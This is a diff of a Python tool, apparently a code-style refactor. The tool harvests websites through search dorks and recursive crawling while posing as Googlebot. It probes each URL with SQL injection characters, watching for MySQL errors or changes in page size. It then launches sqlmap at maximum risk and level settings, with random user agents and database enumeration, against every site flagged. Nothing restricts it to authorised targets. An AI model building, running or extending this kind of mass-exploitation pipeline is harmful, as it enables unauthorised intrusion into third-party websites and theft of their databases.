@@ -4,16 +4,8 @@ import os
 import re
 from random import randint
 from urllib import request
-
-#from selenium.common.exceptions import WebDriverException
 from selenium.common.exceptions import TimeoutException
-#from selenium.common.exceptions import NoSuchElementException
-#from selenium.common.exceptions import UnexpectedAlertPresentException
-#from selenium.common.exceptions import InvalidArgumentException
-
 from selenium import webdriver
-#from selenium.webdriver.chrome.options import Options
-#from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchWindowException
 import _thread
 
@@ -22,10 +14,10 @@ import _thread
 FALSE = 0
 SQL_ERROR = 1
 SIZE_CHANGE = 2
-BLUE_FONT = '\033[94m'  # getsColor
+BLUE_FONT = '\033[94m'    # getsColor
 YELLOW_FONT = '\033[93m'  # test_sites color
-GREEN_FONT = '\033[92m'  # exploit color
-END_FONT = '\033[0m'  # end color
+GREEN_FONT = '\033[92m'   # exploit color
+END_FONT = '\033[0m'      # end color
 # CONFIGURATION FILES
 SQLMAP_PATH = ".."
 PRIORITY_FILE = "sqlVulnerable.txt"
@@ -38,8 +30,6 @@ RECURSIVE_SITES_FILE_LOCK = False
 SITES_FILE_LOCK = False
 DORK_LIST_FILE = "dorks.txt"
 DORK_LIST_FILE_LOCK = False
-#PROXY_FILE = "proxy.txt"
-#PROXY_FILE_lock = False
 BANNING_FILE = "banningIA.txt"
 BANNING_FILE_LOCK = False
 
@@ -50,7 +40,7 @@ BANNED_KEYWORDS_FILE_LOCK = False
 BANNED_KEYWORDS = []
 
 
-def getDomainName(link):
+def get_domain_name(link):
     if link[-1] == '\n':
         link = link[:-1]
     x = link
@@ -80,9 +70,9 @@ def valid(link):
         BANNED_KEYWORDS_FILE_LOCK)
     queue = get_sites(PRIORITY_FILE, PRIORITY_FILE_LOCK) + \
         get_sites(ERROR_FILE, ERROR_FILE_LOCK)
-    bannedExt = [".html", ".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
+    banned_ext = [".html", ".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
     # print(link+'\n')
-    for ext in bannedExt:
+    for ext in banned_ext:
         if link[len(link) - len(ext):] == ext:
             print("NO : extention " + ext + " banned\n")
             return False
@@ -94,13 +84,13 @@ def valid(link):
             continue
         if keyword[len(keyword) - 1] == '\n':
             keyword = keyword[:len(keyword) - 1]
-        if getDomainName(link).find(keyword) != -1:
+        if get_domain_name(link).find(keyword) != -1:
             print("NO : " + keyword + "domain banned\n")
             return False
     for keyword in queue:
         if keyword[len(keyword) - 1] == '\n':
             keyword = keyword[:len(keyword) - 1]
-        if getDomainName(link).find(getDomainName(keyword)) != -1:
+        if get_domain_name(link).find(get_domain_name(keyword)) != -1:
             print("NO : " + keyword + "domain already in queue\n")
             return False
 
@@ -108,28 +98,27 @@ def valid(link):
 
 
 def checkExt(url):
-    bannedExts = [".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
-    for bannedExt in bannedExts:
-        if url.find(bannedExt + "?") != -1:
+    banned_exts = [".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
+    for banned_ext in banned_exts:
+        if url.find(banned_ext + "?") != -1:
 
             return False
-        elif url[len(url) - len(bannedExt):] == bannedExt:
+        elif url[len(url) - len(banned_ext):] == banned_ext:
 
             return False
-    # print("ok")
     return True
 
 
 def check_ext_for_injection(url):
-    bannedExts = [".jpg", ".html", ".jpeg", ".png", ".pdf", ");", ".js"]
-    for bannedExt in bannedExts:
-        if url.find(bannedExt + "?") != -1:
+    banned_exts = [".jpg", ".html", ".jpeg", ".png", ".pdf", ");", ".js"]
+    for banned_ext in banned_exts:
+        if url.find(banned_ext + "?") != -1:
             print("no ext banned")
             return False
-        elif url[len(url) - len(bannedExt):] == bannedExt:
+        elif url[len(url) - len(banned_ext):] == banned_ext:
             print("no ext banned")
             return False
-    # print("ok")
+
     return True
 
 
@@ -138,7 +127,7 @@ def filterListOfRecursive(liste):
     for l in liste:
         add = True
         for valid in result:
-            if getDomainName(l) == getDomainName(valid):
+            if get_domain_name(l) == get_domain_name(valid):
                 add = False
                 break
         if add:
@@ -151,15 +140,13 @@ def filterListOfRecursive(liste):
 def getRecursiveUrls(link, recurive_search):
     if recurive_search == 0:
         return []
-    # if browser==0):
-    #	browser = webdriver.Firefox()
-    #	browser.set_page_load_timeout(15)
+
     text = ""
     headers = {
         'Referer': 'http://www.google.com/bot.html',
         'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
     }
-    #response = requests.get('https://www.mobilefun.fr/apple/iphone-5/gadgets', headers=headers)
+
     try:
         print("recursive for " + link)
         req = request.Request(link, headers=headers)
@@ -173,27 +160,26 @@ def getRecursiveUrls(link, recurive_search):
     urls = re.findall(
         r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+',
         text)
-    result = []
 
-    urlsFiltered = [
+    urls_filtered = [
         i for i in urls if (
-            getDomainName(i) != getDomainName(link) and checkExt(i)) and not bool(
+            get_domain_name(i) != get_domain_name(link) and checkExt(i)) and not bool(
             re.match(
                 r"https*:\/\/[^\/]*\/$",
                 i)) and not bool(
                     re.match(
                         r"https*:\/\/[^\/]*$",
                         i))]
-    # urlsFiltered=[i for i in urlsFiltered if]
 
-    print("extracted %s filtred %s" % (str(len(urls)), str(len(urlsFiltered))))
-    append_sitesOnFile(urlsFiltered, SITES_FILE, SITES_FILE_LOCK)
+    print(
+        "extracted %s filtred %s" %
+        (str(
+            len(urls)), str(
+            len(urls_filtered))))
+    append_sites_on_file(urls_filtered, SITES_FILE, SITES_FILE_LOCK)
 
-    for url in urlsFiltered:
+    for url in urls_filtered:
         getRecursiveUrls(url, recurive_search - 1)
-
-    #result = list( dict.fromkeys(result) )
-    # return result
 
 
 def extract_sites(query):
@@ -249,18 +235,21 @@ def extract_sites(query):
             page += 10
 
     print("%s sites extracted \n" % str(len(liste)))
-    append_sitesOnFile(liste, SITES_FILE, SITES_FILE_LOCK)
-    append_sitesOnFile(liste, RECURSIVE_SITES_FILE, RECURSIVE_SITES_FILE_LOCK)
+    append_sites_on_file(liste, SITES_FILE, SITES_FILE_LOCK)
+    append_sites_on_file(
+        liste,
+        RECURSIVE_SITES_FILE,
+        RECURSIVE_SITES_FILE_LOCK)
     browser.close()
 
 
-def testChar(source, sizeOfOriginal):
+def test_char(source, size_of_original):
     keywords = ['mysql', 'syntax']
     for keyword in keywords:
         if source.lower().find(keyword) != -1:
             print(keyword + " keyword found")
             return SQL_ERROR
-    if abs(sizeOfOriginal - len(source)) > 100:
+    if abs(size_of_original - len(source)) > 100:
         print("size change")
         return SIZE_CHANGE
     else:
@@ -278,7 +267,7 @@ def test_site(site):
         'Referer': 'http://www.google.com/bot.html',
         'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
     }
-    #response = requests.get('https://www.mobilefun.fr/apple/iphone-5/gadgets', headers=headers)
+
     try:
         req = request.Request(site, headers=headers)
         response = request.urlopen(req)
@@ -295,9 +284,9 @@ def test_site(site):
             req = request.Request(site + sql_char, headers=headers)
             response = request.urlopen(req)
             page_source = response.read().decode("utf-8")
-            result = testChar(page_source, site_len)
+            result = test_char(page_source, site_len)
 
-        except Exception as err:
+        except Exception:
             print("error opening site with injection char")
 
             return False
@@ -363,27 +352,16 @@ def get_sites_by_dork(dork):
     extract_sites(dork)
 
 
-def append_sitesOnFile(l, file, lock):
+def append_sites_on_file(l, file, lock):
 
     while lock:
         print("Waiting for %s To be unlocked" % (file))
     lock = True
-    #print(str(len(l))+" have to be writed")
-    #files  = open(file, "r")
-    #sites =[ getDomainName(f) for f in files.readlines() if f !="\n" ]
-    # files.close()
+
     files = open(file, "a")
-    newL = []
-#	for site in l:
-    #	print(" %s not in sites %s"%(getDomainName(site), getDomainName(site) not in sites))
-    #	print(sites)
-#		if  getDomainName(site) not in sites ):
-    #		sites.append(site)
-    #		newL.append(site)
-    #newL=[site for site in l if getDomainName(site) not in sites ]
+
     files.writelines('\n'.join(l))
     files.close()
-    #print(str(len(newL))+" have been writed")
 
     lock = False
 
@@ -394,50 +372,45 @@ def append_site_on_file(site, file_name, lock):
         print("waiting for %s To be Unlocked" % (file))
     lock = True
 
-    #file  = open(file_name, "r")
-    #sites =[ getDomainName(f) for f in file.readlines() if f  !="\n" ]
-    # file.close()
     file = open(file_name, "a")
-    # if getDomainName(site) in sites):
-    #	print("site already in file")
-    # else:
+
     file.write('%s' % site)
     file.close()
 
     lock = False
 
 
-def test_if_ban(liste, site, BANNING_FILE_LOCK):
+def test_if_ban(liste, site, banning_file_lock):
     if site[-1] == '\n':
         site = site[0:-1]
-    numOfTests = 1
+    num_of_tests = 1
     result = False
-    for siteToCheck in liste:
+    for site_to_check in liste:
 
-        if siteToCheck.find(site) != -1:
+        if site_to_check.find(site) != -1:
 
-            liste.remove(siteToCheck)
-            numOfTests = int(siteToCheck.split(":")[1])
-            if numOfTests > 5:
+            liste.remove(site_to_check)
+            num_of_tests = int(site_to_check.split(":")[1])
+            if num_of_tests > 5:
                 result = True
                 print(site + " banned")
             else:
-                numOfTests = numOfTests + 1
+                num_of_tests = num_of_tests + 1
 
                 result = False
             break
     if not result:
 
-        liste.append(site + ":" + str(numOfTests) + "\n")
-    while BANNING_FILE_LOCK:
+        liste.append(site + ":" + str(num_of_tests) + "\n")
+    while banning_file_lock:
         print("waiting for %s To be Unlocked" % (BANNING_FILE))
-    BANNING_FILE_LOCK = True
+    banning_file_lock = True
 
     files = open(BANNING_FILE, "w")
     files.writelines(liste)
     files.close()
 
-    BANNING_FILE_LOCK = False
+    banning_file_lock = False
 
     return result
 
@@ -512,16 +485,11 @@ def get_site(file_name, lock):
     site = sites[0]
     del sites[0]
 
-    # x=input("confirmer"+str(len(sites)))
-
-    #sites = sites[1:]
-
     files = open(file_name, "w")
     if len(sites) > 0:
         files.writelines(sites)
     files.close()
 
-    #x=input("verifier google")
     lock = False
 
     return site
@@ -551,7 +519,6 @@ def get_number(file_name, lock):
 
     lock = False
 
-    # print("sites="+str(sites)+"leen="+str(len(sites)))
     return len(sites)
 
 
@@ -597,17 +564,17 @@ def exploit(max_threads):
 
             if site[len(site) - 1] == '\n':
                 site = site[0:len(site) - 1]
-            siteFile = getDomainName(site)
+            site_file = get_domain_name(site)
             random_int1 = randint(0, 9)
             random_int2 = randint(0, 9)
             print(
                 GREEN_FONT +
                 "executing exploit for " +
-                siteFile +
+                site_file +
                 "\n" +
                 END_FONT)
-            command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, siteFile,
-                                                                                                                                                                                                                     str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2))
+            command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, site_file,
+                                                                                                                                                                                                                     str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2))
             os.system(command)
             while priority_file_number == 0 and error_file_number == 0:
                 print(GREEN_FONT + "Waiting for sites to come\n" + END_FONT)
@@ -712,7 +679,6 @@ def setup():
         RECURSIVE_SITES_FILE +
         " " +
         BANNING_FILE)
-    #os.system("echo \"google.\" > "+BANNED_KEYWORDS_FILE)
 
 
 def recursive_search(number):
@@ -730,13 +696,11 @@ def recursive_search(number):
         print("proirity to readyToCheck_sites")
         time.sleep(60)
         ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
-    #recursiveBrowser = webdriver.Firefox()
+
     while sites_number > 0:
 
         link = get_site(RECURSIVE_SITES_FILE, RECURSIVE_SITES_FILE_LOCK)
 
-        #print("recurive_search for "+link)
-        # newListe=
         getRecursiveUrls(link, number)
 
         ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
@@ -744,8 +708,6 @@ def recursive_search(number):
             RECURSIVE_SITES_FILE,
             RECURSIVE_SITES_FILE_LOCK)
 
-        # if sites_number==0):
-        # recursiveBrowser.close()
         while sites_number == 0:
             print("Waiting for new sites for recursive_search")
             time.sleep(60)
@@ -756,10 +718,8 @@ def recursive_search(number):
             print("proirity to readyToCheck_sites")
             time.sleep(60)
             ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
-        #recursiveBrowser = webdriver.Firefox()
 
     print("end recurive_search")
-    # recursiveBrowser.close()
 
 
 def get_sqlmap_threads():
